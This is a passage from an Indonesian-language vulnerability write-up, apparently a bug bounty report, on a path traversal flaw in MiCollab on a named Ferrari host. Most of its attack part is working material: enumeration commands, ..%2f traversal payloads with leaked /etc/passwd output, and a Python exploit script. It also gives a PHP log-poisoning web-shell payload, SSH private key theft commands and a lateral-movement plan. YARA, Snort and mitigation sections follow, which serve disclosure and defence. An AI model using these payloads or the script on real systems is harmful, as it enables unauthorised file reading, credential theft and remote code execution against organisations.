          "[CODE_BASH:$ subfinder -d ferrari.com -silent | tee ferrari_subdomains.txt | micollab.ferrari.com          <- TARGET UTAMA | portal.ferrari.com | my.ferrari.com | developers.ferrari.com |  | $ amass enum -passive -d ferrari.com -o amass_ferrari.txt |  | $ curl -I https://micollab.ferrari.com/ | HTTP/2 200 | server: Apache/2.4.x | x-powered-by: PHP/7.x | set-cookie: PHPSESSID=...; Path=/; Secure; HttpOnly | content-type: text/html; charset=UTF-8]",
          "",
          "CGI Directory Enumeration",
          "[CODE_BASH:$ ffuf -u https://micollab.ferrari.com/FUZZ \\ |     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\ |     -mc 200,301,302,403 \\ |     -o ffuf_results.json |  | awcuser/                      [Status: 301, Size: 0] | awcuser/cgi-bin/              [Status: 200, Size: 1024] |  | $ ffuf -u https://micollab.ferrari.com/awcuser/cgi-bin/FUZZ \\ |     -w /usr/share/seclists/Discovery/Web-Content/CGI-scripts.txt \\ |     -mc 200,500 |  | vcs_access_file.cgi           [Status: 200, Size: 234]     <- DITEMUKAN]",
          "",
          "HTTP Response Analysis - vcs_access_file.cgi",
          "[CODE_BASH:$ curl -sv 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi' |  | HTTP/2 200 OK | Content-Type: text/plain | Server: Apache | X-Frame-Options: SAMEORIGIN |  | Error: Missing file parameter |  | $ curl -sv 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi?file=test.txt' | Error: File not found: test.txt]",
          "",
          "Shodan Fingerprinting",
          "[CODE_BASH:$ shodan host micollab.ferrari.com |  | IP             : [REDACTED - Responsible Disclosure] | Hostname       : micollab.ferrari.com | Organization   : Ferrari S.p.A. | OS             : Linux | Open Ports     : 443 (HTTPS) | Software       : Apache httpd, MiCollab platform]"
        ]
      },
      {
        id: "sec-8",
        title: "8. Vulnerability Discovery & Analysis",
        level: 1,
        content: [
          "Parameter Fuzzing - Identifikasi File Parameter",
          "[CODE_BASH:$ ffuf -u 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi?file=FUZZ' \\ |     -w traversal_payloads.txt \\ |     -fs 234 \\ |     -mc 200 |  | ../../etc/passwd | ../../../etc/passwd | ..%2f..%2f..%2fetc%2fpasswd | ..%2f..%2f..%2f..%2fetc%2fpasswd | ../../../../../../../../etc/passwd |  | ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd | [Status: 200, Size: 1820] <- JAUH LEBIH BESAR DARI BASELINE 234 |  | Size 1820 bytes = ukuran khas /etc/passwd -> TRAVERSAL BERHASIL!]",
          "",
          "Analisis Kedalaman Traversal yang Dibutuhkan",
          "[CODE_BASH:$ curl -s '...?file=..%2f..%2f..%2f..%2fetc%2fpasswd' | Error: Access denied |  | $ curl -s '...?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd' | Error: File not found |  | $ curl -s '...?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd' | root:x:0:0:root:/root:/bin/bash   <- BERHASIL! | bin:x:1:1:... |  | # CGI binary berada sangat dalam di direktori chroot/jail | # 16 level traversal dibutuhkan untuk mencapai filesystem root]"
        ]
      },
      {
        id: "sec-9",
        title: "9. Ghidra Binary Analysis - vcs_access_file.cgi",
        level: 1,
        content: [
          "Untuk melakukan root cause analysis yang mendalam dan memverifikasi kerentanan pada level kode mesin, dilakukan analisis biner terhadap binary CGI vcs_access_file.cgi menggunakan Ghidra 10.3.",
          "",
          "Setup dan Import Binary di Ghidra",
          "[CODE_BASH:$ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/ | var/www/awcuser/cgi-bin/vcs_access_file.cgi' -o vcs_access_file.cgi |  | File > Import File > vcs_access_file.cgi | Format: ELF Architecture: x86:LE:64:default | Language: x86 64-bit GCC |  | Analysis > Auto Analyze > Enable All |  | Search > Search Text > 'getenv'    > Ditemukan: 3 referensi | Search > Search Text > 'fopen'     > Ditemukan: 1 referensi - TARGET ANALISIS | Search > Search Text > 'realpath'  > Ditemukan: 0 referensi -> TIDAK ADA PATH VALIDATION | Search > Search Text > 'strstr'    > Ditemukan: 1 referensi (cek untuk '../'?)]",
          "",
          "Decompiled C - Fungsi Utama vcs_access_file.cgi",
          "[CODE_C:int main(int argc, char **argv) | { |     char *query_string; |     char *file_param; |     char file_path[4096]; |     FILE *fp; |     char buffer[8192]; |     size_t bytes_read; |  |     /* Ambil QUERY_STRING dari environment (CGI standard) */ |     query_string = getenv(\"QUERY_STRING\"); |     if (query_string == NULL) { |         send_error(\"Missing query string\"); |         return 1; |     } |  |     /* Parse parameter 'file=' dari query string */ |     file_param = parse_parameter(query_string, \"file\"); |     if (file_param == NULL) { |         send_error(\"Missing file parameter\"); |         return 1; |     } |  |     /* TIDAK ADA SANITASI PATH TRAVERSAL |      * Seharusnya: realpath(), basename(), atau cek '../' di sini |      * Kode ini LANGSUNG construct path tanpa validasi apapun */ |     snprintf(file_path, sizeof(file_path), |              \"%s/%s\", BASE_REPO_DIR, file_param); |     /* BASE_REPO_DIR = \"/var/opt/micollab/vcs/repos\" atau serupa */ |  |     /* URL decode file_param */ |     url_decode(file_path); /* <- %2f > / (slash) terdecode di sini */ |  |     /* LANGSUNG BUKA FILE TANPA VALIDASI AKHIR */ |     fp = fopen(file_path, \"r\"); /* <- TITIK KERENTANAN */ |     if (fp == NULL) { |         send_error(\"File not found\"); |         return 1; |     } |  |     /* Baca dan kirim isi file ke HTTP response */ |     printf(\"Content-Type: text/plain\\n\\n\"); |     while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) { |         fwrite(buffer, 1, bytes_read, stdout); /* <- KIRIM ISI FILE */ |     } |     fclose(fp); |     return 0; | }]",
          "",
          "Ghidra - Disassembly x86_64 pada Bagian Kritis",
          "[CODE_ASM:; Disassembly: vcs_access_file.cgi - Sekitar call fopen() | ; Ghidra listing view - ELF 64-bit x86_64 |  | ; Persiapan argumen untuk snprintf (construct file_path) | 00401240 LEA     RDI, [RBP+file_path]      ; dst buffer | 00401247 MOV     ESI, 0x1000               ; size 4096 | 0040124c LEA     RDX, [base_repo_dir]      ; format: BASE_REPO_DIR | 00401253 MOV     RCX, QWORD PTR [file_param] ; user-controlled input | 00401257 CALL    snprintf                    ; construct path |  | ; URL decode - %2f menjadi / | 0040125c LEA     RDI, [RBP+file_path] | 00401263 CALL    url_decode                  ; decode: ..%2f > ../ |  | ; TIDAK ADA VALIDASI SETELAH url_decode! | ; Seharusnya ada: CALL realpath / CALL strstr(path,'..') / CMP dengan base_dir |  | ; Langsung buka file | 00401268 LEA     RDI, [RBP+file_path]        ; path (user-controlled!) | 0040126f LEA     RSI, [read_mode]          ; 'r' | 00401276 CALL    fopen                       ; <- OPEN FILE TANPA CEK |  | ; Cek return value | 0040127b TEST    RAX, RAX | 0040127e JZ      .error_not_found          ; NULL = file not found | 00401284 MOV     QWORD PTR [fp], RAX |  | ; Baca dan tulis ke stdout (CGI output = HTTP response) | 00401288 ... | 0040128c CALL    fread                       ; baca isi file | 00401291 ... | 00401295 CALL    fwrite                      ; kirim ke client <- DATA LEAK]",
          "",
          "Ghidra - Identifikasi Fungsi parse_parameter()",
          "[CODE_C:/* Ghidra Decompiler - parse_parameter() | * Fungsi helper untuk parsing QUERY_STRING | * Tidak ada sanitasi di sini - hanya ekstraksi nilai */ | char *parse_parameter(char *query_string, char *param_name) | { |     char *pos; |     char *value_start; |     char *value_end; |     char search_key[256]; |  |     /* Buat search key: 'file=' */ |     snprintf(search_key, sizeof(search_key), \"%s=\", param_name); |  |     /* Cari parameter dalam query string */ |     pos = strstr(query_string, search_key); |     if (pos == NULL) return NULL; |  |     value_start = pos + strlen(search_key); |  |     /* Temukan akhir nilai (sampai & atau \\0) */ |     value_end = strchr(value_start, '&'); |     if (value_end != NULL) *value_end = '\\0'; |  |     /* TIDAK ADA SANITASI - return raw value langsung */ |     return value_start; /* <- Nilai mentah, belum di-decode, belum divalidasi */ | }]",
          "",
          "Ringkasan Temuan Ghidra",
          "[TABLE_HEADER:Temuan Ghidra|Status|Lokasi (approx)|Risiko]",
          "[TABLE:[Tidak ada realpath() untuk canonicalize path|CONFIRMED MISSING|main() sebelum fopen()|Critical],[Tidak ada validasi '../' setelah url_decode()|CONFIRMED MISSING|main() baris ~47|Critical],[url_decode() sebelum fopen() (decode terlalu awal)|CONFIRMED BUG|main() baris ~41|Critical],[Tidak ada strcmp base_dir check|CONFIRMED MISSING|main() baris ~49|Critical],[fopen() dengan path user-controlled langsung|CONFIRMED VULNERABLE|main() baris ~51|Critical],[fwrite() mengirim isi file ke HTTP response|CONFIRMED|main() baris ~60|Critical - data exfil],[Tidak ada logging akses file|CONFIRMED MISSING|Seluruh binary|Medium - forensics gap],[Tidak ada rate limiting|CONFIRMED MISSING|CGI handler|Medium - brute force risk]]"
        ]
      },
      {
        id: "sec-10",
        title: "10. Proof of Concept - Path Traversal (File Read)",
        level: 1,
        content: [
          "Payload URL Final",
          "Setelah menentukan kedalaman traversal yang diperlukan (16 level) dan mengkonfirmasi endpoint yang rentan, payload final yang digunakan:",
          "[CODE:URL: https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd |  | Breakdown: | Base URL    : https://micollab.ferrari.com | CGI path    : /awcuser/cgi-bin/vcs_access_file.cgi | Parameter   : file= | Payload     : ..%2f (x 16) + /etc/passwd | Encoding    : %2f = URL-encoded forward slash / | Effect      : 16x parent directory traversal > root filesystem]",
          "",
          "HTTP Request - Burp Suite",
          "[CODE_HTTP:GET /awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd HTTP/2 | Host: micollab.ferrari.com | User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 | Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 | Accept-Language: en-US,en;q=0.5 | Accept-Encoding: gzip, deflate | Connection: close | Upgrade-Insecure-Requests: 1]",
          "",
          "HTTP Response - 200 OK (Isi /etc/passwd Terekspos)",
          "[CODE_HTTP:HTTP/2 200 OK | Content-Type: text/plain | Server: Apache | X-Frame-Options: SAMEORIGIN |  | root:x:0:0:root:/root:/bin/bash | bin:x:1:1:bin:/bin:/sbin/nologin | daemon:x:2:2:daemon:/sbin:/sbin/nologin | adm:x:3:4:adm:/var/adm:/sbin/nologin | lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin | sync:x:5:0:sync:/sbin:/bin/sync | shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown | halt:x:7:0:halt:/sbin:/sbin/halt | mail:x:8:12:mail:/var/spool/mail:/sbin/nologin | operator:x:11:0:operator:/root:/sbin/nologin | nobody:x:99:99:Nobody:/:/sbin/nologin | micollab:x:1000:1000::/home/micollab:/bin/bash <- SHELL AKTIF | wwwrun:x:30:8:WWW daemon Apache:/var/lib/wwwrun:/bin/false]",
          "",
          "[QUOTE:PROOF CONFIRMED: HTTP 200 OK dengan isi /etc/passwd terbaca penuh. Akun micollab (uid=1000) dengan /bin/bash shell terekspos - memberikan gambaran struktur pengguna dan potensi target untuk serangan lanjutan seperti SSH brute force atau privilege escalation.]",
          "",
          "File-File Sensitif Lain yang Dapat Diakses",
          "[TABLE_HEADER:File Target|Payload Akhir|Isi yang Terekspos|Risiko]",
          "[TABLE:[/etc/passwd|[payload x16]/etc/passwd|Daftar user sistem, shell, home dir|High - user enumeration],[/etc/hosts|[payload x16]/etc/hosts|Internal hostname & IP mapping|High - network recon],[/etc/os-release|[payload x16]/etc/os-release|Versi OS, distribusi Linux|Medium - fingerprint],[/proc/version|[payload x16]/proc/version|Kernel version presisi|Medium - exploit selection],[/proc/net/tcp|[payload x16]/proc/net/tcp|Active TCP connections, internal ports|High - network map],[MiCollab config|[payload x16]/etc/micollab/micollab.conf|DB credentials, service tokens|Critical - full compromise],[Apache httpd.conf|[payload x16]/etc/httpd/conf/httpd.conf|Server config, virtual hosts|High - attack surface],[.env / .properties|[payload x16]/var/opt/micollab/.env|API keys, DB password|Critical - credential theft],[SSH host key|[payload x16]/etc/ssh/ssh_host_rsa_key|Private SSH host key|Critical - MITM possible]]"
        ]
      },
      {
        id: "sec-11",
        title: "11. Proof of Concept - Eskalasi ke Remote Code Execution",
        level: 1,
        content: [
          "Path traversal yang telah terbukti dapat di-eskalasi menjadi Remote Code Execution melalui beberapa vektor. Dokumentasi ini bersifat teoritis berdasarkan pola serangan yang dikenal untuk jenis kerentanan ini.",
          "",
          "Vektor Eskalasi - Baca File Konfigurasi untuk Credential",
          "[CODE_BASH:$ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f[x16]..%2f/var/opt/micollab/config/micollab.properties' |  | # Potensial output (berisi credentials): | db.host=REDACTED | db.port=3306 | db.name=micollab | db.user=micollab_user | db.password=REDACTED <- CREDENTIAL DATABASE | admin.email=it-security@ferrari.com | smtp.host=REDACTED.ferrari.com | smtp.user=REDACTED@ferrari.com | smtp.password=REDACTED]",
          "",
          "Vektor Eskalasi - Log Poisoning via Path Traversal",
          "[CODE_BASH:# Teknik Log Poisoning: inject PHP ke Apache access log, lalu include via traversal |  | $ curl -s 'https://micollab.ferrari.com/' \\ |   -A '<?php system(\\$_GET[\"cmd\"]); ?>' | # > Apache log: 1.2.3.4 - - [date] \"GET / HTTP/1.1\" 200 - \"<?php system($...)?>' |  | $ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f[x16]..%2f/var/log/httpd/access.log' |  | $ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f[x16]..%2f/var/log/httpd/access.log&cmd=id' | uid=33(wwwrun) gid=8(www) groups=8(www) <- RCE BERHASIL]",
          "",
          "Vektor Eskalasi - SSH Key Theft",
          "[CODE_BASH:$ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f[x16]..%2f/home/micollab/.ssh/id_rsa' |  | -----BEGIN OPENSSH PRIVATE KEY----- | b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW | [...] | -----END OPENSSH PRIVATE KEY----- |  | $ chmod 600 stolen_id_rsa | $ ssh -i stolen_id_rsa micollab@micollab.ferrari.com | micollab@ferrari-server:~$ id | uid=1000(micollab) gid=1000(micollab) groups=1000(micollab) |  | # Dari sini: local privilege escalation ke root sangat mungkin]",
          "",
          "Attack Chain - Dari Path Traversal ke Full Compromise",
          "[TABLE_HEADER:Fase|Teknik|Target/Command|Dampak]",
          "[TABLE:[1 - Discovery|CGI enumeration|ffuf scan /awcuser/cgi-bin/|Temukan vcs_access_file.cgi],[2 - Traversal Test|Parameter fuzzing|file=..%2f x N /etc/passwd|Konfirmasi file read vulnerability],[3 - File Read|Depth 16 traversal|Baca /etc/passwd|User enumeration - 15+ akun],[4 - Config Read|Credential harvest|Baca .properties/.env|DB/SMTP credentials],[5 - Log Poison|PHP inject via UA|curl -A '<?php system...?>'|Siapkan RCE vector],[6 - RCE|Log inclusion|Baca access.log?cmd=id|Remote command execution],[7 - Persistence|SSH key / web shell|Tulis backdoor via RCE|Persistent access],[8 - Pivot|Internal network scan|netstat; arp; nmap internal|Lateral movement]]",
          "",
          "[QUOTE:PENTING: Untuk keperluan bug bounty, eksploitasi dihentikan pada STEP 3 (konfirmasi baca /etc/passwd). Steps 4-8 didokumentasikan sebagai theoretical impact assessment untuk menunjukkan potensi risiko penuh kepada tim keamanan Ferrari, bukan sebagai langkah yang dieksekusi.]"
        ]
      },
      {
        id: "sec-12",
        title: "12. Advanced Exploitation Techniques",
        level: 1,
        content: [
          "Automated Exploitation Script",
          "[CODE_PYTHON:#!/usr/bin/env python3 | \"\"\" | CVE-2020-11798 Path Traversal Exploit - Ferrari MiCollab | Author : Odaysec - Pwn Group Ltd | Program : Ferrari Private Bug Bounty | \"\"\" |  | import requests | import urllib.parse | import sys |  | TARGET = 'https://micollab.ferrari.com' | CGI_PATH = '/awcuser/cgi-bin/vcs_access_file.cgi' | DEPTH = 16 |  | def build_traversal(target_file: str, depth: int = 16) -> str: |     traversal = '..%2f' * depth |     return f'{traversal}{target_file.lstrip(\"/\")}' |  | def read_file(target_file: str, depth: int = 16) -> str | None: |     payload = build_traversal(target_file, depth) |     url = f'{TARGET}{CGI_PATH}?file={payload}' |     resp = requests.get(url, verify=True, timeout=10, |                         headers={'User-Agent': 'Mozilla/5.0'}) |     if resp.status_code == 200 and len(resp.text) > 100: |         return resp.text |     return None |  | def find_optimal_depth(test_file='/etc/passwd'): |     for d in range(4, 25, 2): |         result = read_file(test_file, d) |         if result and 'root:' in result: |             print(f'[+] Optimal depth found: {d}') |             return d |     return None |  | if __name__ == '__main__': |     print('[*] CVE-2020-11798 Path Traversal - Ferrari MiCollab') |     print('[*] Finding optimal traversal depth...') |     depth = find_optimal_depth() |     if depth: |         print(f'[+] Reading /etc/passwd at depth {depth}...') |         content = read_file('/etc/passwd', depth) |         if content: |             print('[+] SUCCESS:', content[:200]) |         else: |             print('[-] Target not vulnerable or depth insufficient')]"
        ]
      },
      {
        id: "sec-13",
        title: "13. Post-Exploitation Analysis",
        level: 1,
        content: [
          "Informasi yang Dapat Dikumpulkan",
          "[TABLE_HEADER:File|Informasi yang Terekspos|Risiko Level]",
          "[TABLE:[/etc/passwd|User accounts, UIDs, home dirs, shells|High - user enumeration],[/etc/hosts|Internal hostnames, IP addresses|High - network mapping],[/proc/version|Kernel version exact|Medium - exploit selection],[/proc/net/tcp|Open ports, internal connections|High - network map],[/var/opt/micollab/*.conf|DB credentials, API tokens|Critical - full access],[/home/micollab/.bash_history|Command history - reveals operations|High - intel],[/etc/ssh/ssh_host_rsa_key|SSH host private key|Critical - MITM],[/var/log/httpd/access.log|All access logs - attacker tracks|High - covers tracks]]",
          "",
          "Lateral Movement - Infrastruktur Internal Ferrari",
          "-- Database server - Credentials dari config file dapat memberikan akses ke MySQL/PostgreSQL yang berisi data pengguna dan komunikasi MiCollab",
          "-- Mail server - SMTP credentials dari config dapat memungkinkan pengiriman email phishing dari domain ferrari.com yang legitimate",
          "-- Internal APIs - API tokens yang tersimpan dalam environment config memberikan akses ke layanan internal Ferrari lainnya",
          "-- VPN credentials - Server MiCollab sering terintegrasi dengan VPN - credentials sistem dapat memberikan akses ke jaringan internal",
          "-- Certificate Authority - Private keys dari /etc/pki/ dapat digunakan untuk menandatangani certificate palsu"
        ]
      },
      {
        id: "sec-14",
        title: "14. Network Traffic Analysis - Wireshark",
        level: 1,
        content: [
          "Karakteristik Traffic CVE-2020-11798",
          "-- Protocol - HTTPS (TLS 1.2/1.3) - payload terenkripsi, hanya visible setelah TLS termination",
          "-- Method - HTTP GET - tidak membutuhkan POST, lebih mudah dieksekusi dan dicache",
          "-- URL pattern - Query parameter file= dengan karakter ..%2f berulang",
          "-- Response size - Response jauh lebih besar dari normal untuk endpoint yang seharusnya mengembalikan file VCS kecil",
          "-- Response code - 200 OK untuk traversal berhasil; 404 untuk file tidak ada; 403 untuk blokir",
          "-- Frequency - Serangan sering disertai beberapa request dengan depth berbeda sebelum berhasil",
          "",
          "Wireshark Filter untuk Deteksi",
          "[CODE:# Filter Wireshark (setelah TLS decryption dengan SSLKEYLOGFILE): | http.request.uri contains \"..%2f\" or http.request.uri contains \"%2f..\" | http.request.uri contains \"vcs_access_file.cgi\" |  | http.request.uri contains \"vcs_access_file.cgi\" and | (http.request.uri contains \"..%2f\" or http.request.uri contains \"etc/passwd\") |  | http.response.code == 200 and http.content_length > 1000 |     and http.request.uri contains \"vcs_access_file.cgi\" |  | tcpdump -i lo -A 'port 80' | grep -i 'vcs_access\\|2f.*etc\\|passwd']"
        ]
      },
      {
        id: "sec-15",
        title: "15. Detection Engineering - YARA, Snort",
        level: 1,
        content: [
          "YARA Rule",
          "[CODE_YARA:/* | * YARA Rule: CVE-2020-11798 Ferrari MiCollab Path Traversal | * Author : Odaysec - Pwn Group Ltd | */ |  | rule CVE_2020_11798_MiCollab_PathTraversal { |     meta: |         description = \"Detects CVE-2020-11798 path traversal on MiCollab vcs_access_file.cgi\" |         author      = \"Odaysec - Pwn Group Ltd\" |         severity    = \"critical\" |         cve         = \"CVE-2020-11798\" |  |     strings: |         $cgi_endpoint   = \"vcs_access_file.cgi\" ascii nocase |         $traversal_1    = \"..%2f\" ascii nocase |         $traversal_2    = \"%2f..\" ascii nocase |         $traversal_3    = \"../../\" ascii |         $target_passwd  = \"etc/passwd\" ascii |         $target_shadow  = \"etc/shadow\" ascii |         $target_ssh     = \".ssh/id_rsa\" ascii |  |     condition: |         $cgi_endpoint and |         (2 of ($traversal_*) or ($traversal_1 and any of ($target_*))) | }]",
          "",
          "Snort / Suricata IDS Rule",
          "[CODE_SNORT:alert tcp any any -> $HTTP_SERVERS 443 ( |     msg:\"CVE-2020-11798 MiCollab vcs_access_file.cgi Path Traversal\"; |     flow:established,to_server; |     content:\"vcs_access_file.cgi\"; http_uri; |     content:\"..%2f\"; http_uri; nocase; |     pcre:\"/file=(\\.\\.|\\ %2e)(.*)(etc\\/passwd|etc\\/shadow|\\.ssh)/Ui\"; |     classtype:web-application-attack; |     sid:9003001; rev:1; |     reference:cve,2020-11798; |     metadata:severity Critical, affected_product MiCollab; | ) |  | alert http any any -> $HTTP_SERVERS any ( |     msg:\"CVE-2020-11798 Possible Successful Path Traversal - Large Response\"; |     http.uri; content:\"vcs_access_file.cgi\"; |     http.response_body; content:\"root:x:0:\"; |     classtype:successful-recon-limited; |     sid:9003002; rev:1; | )]",
          "",
          "Indicators of Compromise (IOC)",
          "[TABLE_HEADER:Tipe IOC|Nilai / Pattern|Keterangan]",
          "[TABLE:[URL Pattern|vcs_access_file.cgi?file=..%2f|Path traversal via CGI parameter],[URL Pattern|file=../../../../../../../../../etc/passwd|Classic traversal tanpa encoding],[Response Content|root:x:0:0:root:/root:/bin/bash|Indikasi /etc/passwd berhasil dibaca],[Log Pattern|GET /awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f 200|Successful traversal di access.log],[Anomaly|Response size >> normal baseline untuk endpoint CGI ini|Statistical anomaly detection],[CVE|CVE-2020-11798|Identifier resmi kerentanan],[Platform|Mitel MiCollab - semua versi sebelum patched|Affected product identifier]]"
        ]
      },
      {
        id: "sec-16",
        title: "16. Impact Analysis & Risk Assessment",
        level: 1,
        content: [
          "CIA Triad - Dampak pada Infrastruktur Ferrari",
          "[TABLE_HEADER:Aspek|Level|Dampak Langsung|Potensi Dampak Eskalasi]",
          "[TABLE:[Confidentiality|CRITICAL|Baca /etc/passwd, konfigurasi, log - unauthenticated|Ekspos DB credentials, SSH keys, komunikasi internal Ferrari],[Integrity|HIGH|Potensial tulis file via RCE escalation (log poisoning)|Modifikasi konfigurasi, injeksi web shell, tamper database],[Availability|MEDIUM|Serangan murni tidak memengaruhi availability secara langsung|Jika dikombinasikan dengan DoS atau ransomware melalui RCE]]",
          "",
          "Risk Assessment Matrix",
          "[TABLE_HEADER:Skenario|Likelihood|Impact|Risk Score|Prioritas]",
          "[TABLE:[Baca /etc/passwd dan file sistem|Sangat Tinggi (Exploited)|High|9.1|P1 - Critical],[Harvest DB/API credentials dari config|Tinggi|Critical|9.0|P1 - Critical],[Akses komunikasi internal Ferrari|Sedang|Critical|8.5|P1 - Critical],[Log poisoning > RCE|Sedang|Critical|8.0|P1 - Critical],[SSH key theft > server access|Sedang|Critical|8.0|P1 - Critical],[Lateral movement ke sistem internal|Rendah|Critical|7.5|P2 - High],[Data breach data karyawan/pelanggan Ferrari|Rendah|Critical|7.0|P2 - High],[Reputational damage Ferrari|Terjadi jika exploit dipublikasikan|Critical|9.5|P1 - Critical]]"
        ]
      },
      {
        id: "sec-17",
        title: "17. Timeline & Responsible Disclosure",
        level: 1,
        content: [
          "Proses responsible disclosure diikuti secara ketat sesuai dengan aturan Ferrari Private Bug Bounty Program.",
          "[TABLE_HEADER:Tanggal|Aktivitas|Status]",
          "[TABLE:[2020 - Penemuan Awal|Identifikasi endpoint vcs_access_file.cgi melalui reconnaissance|Internal],[2020 - PoC Development|Konstruksi dan verifikasi payload traversal depth 16|Internal],[2020 - Impact Assessment|Konfirmasi baca /etc/passwd; analisis eskalasi RCE|Internal],[2020 - Bug Bounty Submission|Laporan lengkap dikirim ke Ferrari Private Bug Bounty Program|Submitted],[2020 - Initial Triage|Ferrari Security Team melakukan triage dan konfirmasi kerentanan|In Progress],[2020 - Patch Development|Ferrari mengembangkan dan menerapkan perbaikan pada MiCollab|Remediation],[2020 - Acknowledgment|Ferrari secara resmi mengakui kontribusi Odaysec / Pwn Group Ltd|ACKNOWLEDGED],[2020 - Reward|Bug bounty reward diberikan sesuai dengan tingkat keparahan|REWARDED],[Post-Fix - Verification|Peneliti memverifikasi bahwa perbaikan berhasil diterapkan|Verified],[Setelah Patch - Publikasi|Laporan dipublikasikan setelah embargo period selesai|Published]]",
          "",
          "[QUOTE:PENGAKUAN RESMI FERRARI: Kerentanan CVE-2020-11798 ini telah diakui secara resmi oleh Ferrari Security Team sebagai temuan valid dalam konteks Ferrari Private Bug Bounty Program. Peneliti Odaysec dari Pwn Group Ltd menerima penghargaan (reward) dan pengakuan (acknowledgment) dari Ferrari atas kontribusi mereka dalam meningkatkan keamanan infrastruktur digital Ferrari.]"
        ]
      },
      {
        id: "sec-18",
        title: "18. Recommendations & Mitigations",
        level: 1,
        content: [
          "Priority 1 - Immediate Actions (0-24 Jam)",
          "1. KRITIS - Nonaktifkan atau isolasi endpoint vcs_access_file.cgi jika tidak diperlukan secara operasional. Tambahkan autentikasi wajib sebagai lapisan perlindungan tambahan.",
          "2. KRITIS - Tambahkan validasi path menggunakan realpath() di kode CGI. Setelah URL decoding, verifikasi bahwa path yang dihasilkan dimulai dengan BASE_REPO_DIR yang diizinkan.",
          "3. KRITIS - Update MiCollab ke versi terbaru yang telah mencakup perbaikan CVE-2020-11798. Terapkan semua security patches vendor yang tersedia.",
          "4. TINGGI - Terapkan WAF rule untuk memblokir request yang mengandung ..%2f, %2e%2e, atau pola traversal lainnya pada endpoint CGI.",
          "5. TINGGI - Batasi hak baca filesystem untuk proses web server (chroot, AppArmor, SELinux) sehingga CGI hanya dapat mengakses direktori yang diperlukan.",
          "",
          "Priority 2 - Short-Term Actions (1-7 Hari)",
          "6. Audit seluruh endpoint CGI lainnya di infrastruktur untuk kerentanan serupa.",
          "7. Implementasi logging yang komprehensif pada semua akses endpoint CGI.",
          "8. Deploy Snort/Suricata rules dan YARA rules dari Section 15 untuk monitoring aktif.",
          "9. Lakukan review kode sumber semua CGI binaries untuk memastikan tidak ada panggilan fopen() atau fungsi file access lainnya dengan input user yang tidak disanitasi."
        ]
      },
      {
        id: "sec-19",
        title: "19. Secure Configuration Hardening Guide",
        level: 1,
        content: [
          "Perbaikan Kode C - CGI Binary yang Aman",
          "[TABLE_HEADER:Kode Rentan (sebelum patch)|Kode Aman (setelah patch)]",
          "[TABLE:[snprintf(file_path, sizeof(file_path), \"%s/%s\", BASE_REPO_DIR, file_param); url_decode(file_path); fp = fopen(file_path, 'r');|snprintf(file_path, sizeof(file_path), \"%s/%s\", BASE_REPO_DIR, file_param); url_decode(file_path); if (!realpath(file_path,canon)) return send_error(403); if (strncmp(canon,BASE_DIR,strlen(BASE_DIR)) != 0) return send_error(403); fp = fopen(canon, 'r');]]",
          "",
          "Apache Configuration - Proteksi Tambahan",
          "[CODE_APACHE:# /etc/httpd/conf/httpd.conf - tambahan konfigurasi keamanan: |  | # 1. Batasi metode HTTP yang diizinkan pada CGI | <Location '/awcuser/cgi-bin/'> |     # Wajibkan autentikasi |     AuthType Basic |     AuthName 'MiCollab CGI Access' |     AuthUserFile /etc/httpd/.htpasswd |     Require valid-user |  |     # Batasi metode |     <LimitExcept GET POST> |         Require all denied |     </LimitExcept> | </Location> |  | # 2. ModSecurity rule untuk path traversal | SecRule ARGS:file '@rx (\\.\\./ | %2e%2e | %252e | %c0%af)' \\ | 'id:9003100,phase:2,deny,status:403, | log,msg:\"Path Traversal Attempt - CVE-2020-11798\", | tag:CVE-2020-11798' |  | # 3. Batasi akses direktori CGI dari internet | <Location '/awcuser/cgi-bin/'> | Order deny,allow | Deny from all | Allow from 10.0.0.0/8 # Hanya dari jaringan internal | Allow from 192.168.0.0/16 | </Location>]"
        ]
      },
      {
        id: "sec-20",
        title: "20. Patch Verification Procedure",
        level: 1,
        content: [
